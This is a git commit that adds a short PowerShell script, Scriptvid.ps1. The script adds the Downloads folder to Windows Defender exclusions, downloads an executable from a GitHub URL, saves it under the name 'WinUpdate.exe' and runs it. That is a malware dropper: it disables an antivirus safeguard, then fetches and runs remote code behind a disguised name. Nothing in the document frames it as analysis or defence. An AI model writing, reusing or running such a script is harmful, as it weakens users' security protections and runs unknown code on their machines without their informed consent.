5881d82bf8ab4f76f70e094b84b9e1a6305e7482
Black Code01 <146079697+Black-Code01@users.noreply.github.com>
2025-02-10 10:23:44 +0200

    Add files via upload

---
+++ Scriptvid.ps1
@@ -0,0 +1,12 @@
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+$url = 'https://raw.githubusercontent.com/Black-Code01/A/refs/heads/main/Program.exe'
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'C:\Program Files', 'WinUpdate.exe')
+
+# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
+Start-Sleep -Milliseconds 100 
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+
+# Run the downloaded file after the download is complete
+Start-Process -FilePath $outputFile
